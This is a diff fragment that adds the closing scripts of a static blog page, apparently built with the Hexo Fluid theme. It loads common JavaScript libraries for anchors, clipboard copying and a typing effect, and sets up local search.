+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
